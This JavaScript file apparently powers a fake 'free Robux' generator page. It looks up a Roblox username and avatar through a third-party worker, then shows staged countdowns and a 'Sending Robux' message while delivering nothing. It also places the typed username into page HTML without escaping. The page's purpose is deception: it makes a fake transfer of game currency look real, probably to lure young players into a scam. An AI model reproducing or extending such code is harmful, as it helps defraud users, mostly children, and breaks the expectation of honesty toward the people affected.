const rbxbtn = document.querySelector(".getrbx");
const box1 = document.querySelector(".box2");
const box2 = document.querySelector(".boxanimation");
const box3 = document.querySelector(".box3");
const box4 = document.querySelector(".box4");
const rbxtotal = document.querySelectorAll(".details");
const username = document.querySelector(".username");
const animationtxt = document.querySelector(".animationtxt");
const logo_player = document.querySelector("#logo_player");
const errorMsg = document.querySelector(".error-message");
const loadingSpinner = document.createElement("div");

loadingSpinner.classList.add("loading-spinner");
loadingSpinner.style.display = "none";
rbxbtn.parentElement.appendChild(loadingSpinner);

let isFetching = false;

document.querySelector(".audio_btn").addEventListener("click", function () {
  let audio = document.querySelector(".audio-element");
  if (audio.paused) {
    audio.play();
  } else {
    audio.pause();
  }
});

async function fetchProfile() {
  let trimmedUsername = username.value.trim();

  if (!trimmedUsername) {
    showError("⚠️ Please enter a valid username.");
    return;
  }

  if (isFetching) return;
  isFetching = true;
  rbxbtn.disabled = true;
  hideError();

  loadingSpinner.style.display = "inline-block";
  animationtxt.innerHTML = `🔄 Searching for <b>${trimmedUsername}</b>... Please wait.`;

  try {
    let response = await fetch(
      `https://noisy-morning-84f8.tkdwalid2.workers.dev/users/search?keyword=${trimmedUsername}`
    );
    if (!response.ok) throw new Error("Failed to fetch user data");
    let data = await response.json();

    if (data.data && data.data.length > 0) {
      let user = data.data[0];

      let avatarResponse = await fetch(
        `https://noisy-morning-84f8.tkdwalid2.workers.dev/users/avatar?userId=${user.id}`
      );
      if (!avatarResponse.ok) throw new Error("Failed to fetch avatar data");
      let avatarData = await avatarResponse.json();

      if (avatarData.data && avatarData.data.length > 0) {
        let avatarUrl = avatarData.data[0].imageUrl;

        animationtxt.innerHTML = `✅ Found <b>${user.displayName}</b>!`;

        startPostSearchCountdown(10);

        function startPostSearchCountdown(seconds) {
          let countdownElement = document.querySelector(".countdown-animation");
          countdownElement.style.display = "block";

          let countdown = seconds;
          countdownElement.innerHTML = `⏳ Processing in <b>${countdown}</b> seconds...`;

          let countdownInterval = setInterval(() => {
            countdown--;
            if (countdown > 0) {
              countdownElement.innerHTML = `⏳ Processing in <b>${countdown}</b> seconds...`;
            } else {
              clearInterval(countdownInterval);
              countdownElement.innerHTML = `✅ Processing complete!`;
            }
          }, 1000);
        }

        logo_player.src = avatarUrl;
        document.querySelector(".userX01").src = avatarUrl;

        box1.style.display = "none";
        box2.style.display = "flex";
        setTimeout(showbox2, 10000);
        setTimeout(showbox3, 10000);

        hideError();
      } else {
        showError("⚠️ Avatar not found!");
      }
    } else {
      showError("❌ User not found! Please check the username.");
    }
  } catch (error) {
    console.error("Error fetching profile:", error);
    showError(
      "🔴 We couldn’t find this username. Please refresh the page and try again with a valid username!"
    );
  }

  loadingSpinner.style.display = "none";
  isFetching = false;
  rbxbtn.disabled = false;
}

function showError(message) {
  errorMsg.innerText = message;
  errorMsg.style.display = "block";
  rbxbtn.classList.add("error-animation");
  setTimeout(() => {
    rbxbtn.classList.remove("error-animation");
  }, 500);
}

function hideError() {
  errorMsg.style.display = "none";
}

rbxbtn.addEventListener("click", fetchProfile);

rbxtotal.forEach((btn) => {
  btn.addEventListener("click", () => {
    box3.style.display = "none";
    box2.style.display = "flex";
    setTimeout(showboxagain, 3500);
    setTimeout(showbox4, 3500);
    animationtxt.innerHTML = `🔄 Sending Robux to <b>${username.value}</b>...`;
  });
});

let showboxagain = () => {
  box2.style.display = "none";
};
let showbox2 = () => {
  box2.style.display = "none";
};
let showbox3 = () => {
  box3.style.display = "flex";
};
let showbox4 = () => {
  box4.style.display = "flex";
};
